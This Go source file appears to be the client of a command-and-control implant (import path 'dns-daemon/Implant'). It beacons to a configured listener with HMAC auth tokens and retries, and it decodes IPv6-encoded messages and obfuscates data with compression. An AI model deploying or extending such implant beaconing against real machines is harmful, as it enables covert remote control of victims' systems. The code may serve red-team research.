package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"time"

	"github.com/matt-culbert/dns-daemon/Implant/shared"
)

// Struct to hold the response format from the server
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

func makeGetRequest(baseUrl string, maxRetries int, params url.Values) (*http.Response, error) {
	var resp *http.Response
	var err error
	reqURL, _ := url.Parse(baseUrl)
	reqURL.RawQuery = params.Encode()

	for attempts := 0; attempts < maxRetries; attempts++ {
		resp, err = http.Get(reqURL.String())
		if err == nil {
			// Success, return the response
			return resp, nil
		}

		// Log the error and retry after a delay
		fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
		time.Sleep(10 * time.Second)
	}

	// Return the last error after exhausting retries
	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
}

var CompUUID string

func main() {
	// testing compression
	data := "Sensitive data that needs to be obfuscated"
	compedData, boolRes := shared.DoComp(data)
	if !boolRes {
		fmt.Println("compression failed")
	}

	fmt.Printf("%x", compedData.Bytes())

	// Load configuration from embedded data
	conf, err := shared.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	maxRetries := 3

	for {
		baseUrl := ""

		baseUrl = "http://" + conf.Listener + "/auth/" + CompUUID

		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)

		//reqURL, _ := url.Parse(baseUrl)

		// Add params to the query (The auth token and time)
		params := url.Values{}
		params.Add("token", token)
		params.Add("timestamp", timestamp)
		//reqURL.RawQuery = params.Encode()
		//fmt.Println(reqURL.String())

		resp, err := makeGetRequest(baseUrl, maxRetries, params)
		if err != nil {
			fmt.Println("Final error:", err)
			return
		}

		defer resp.Body.Close()

		// Check the response status
		if resp.StatusCode != http.StatusOK {
			// non-OK http status
			break
		}

		// Read the response body
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			// reading response body failed
			break
		}

		// Parse the JSON response
		var data ResponseData
		err = json.Unmarshal(body, &data)
		if err != nil {
			// parsing json failed
			break
		}

		// Print the values (for testing)
		fmt.Println("Message:", data.Message)
		fmt.Println("Key:", data.Key)

		decoded, _ := shared.DecodeIPv6ToString(string(data.Message))
		fmt.Println("Decoded string:", decoded)

		// Verify the message with the received HMAC
		if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
			fmt.Println("HMAC is valid!")
			break
		} else {
			fmt.Println("HMAC is invalid or message was tampered with.")
			break
		}
	}
}
